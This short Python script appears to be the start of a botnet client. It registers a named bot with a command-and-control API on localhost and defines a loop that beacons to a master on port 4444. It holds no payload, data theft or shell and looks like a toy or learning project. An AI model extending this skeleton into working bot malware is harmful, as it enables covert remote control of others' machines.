#! /usr/share/python3 

import requests
import socket
import time
import subprocess

master_ip = '127.0.0.1'
bot_name = "aditya"
bot_ip = "128.12.21.12"
interval = 10

def initiate(master_ip, bot_name, bot_ip):
    print("[*] Registering bot to the API Server .... ")
    request = requests.get('http://127.0.0.1:5000/register_bot?bot_name=' + bot_name + '&bot_ip=' + bot_ip)
    if request.text == "200 OK":
        print("[+] Bot has been registered to the master server!")
    else:
        print("[-] Failed to register the Bot to the master server!")
        exit()

def communicate_to_master(interval, master_ip):
    json_data = 'Hello Master!'
    while True:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        time.sleep(interval)
        try:
            sock.connect((master_ip, 4444))
            sock.sendall(bytes(json_data,encoding="utf-8"))

        finally:
            sock.close()

initiate(master_ip, bot_name, bot_ip)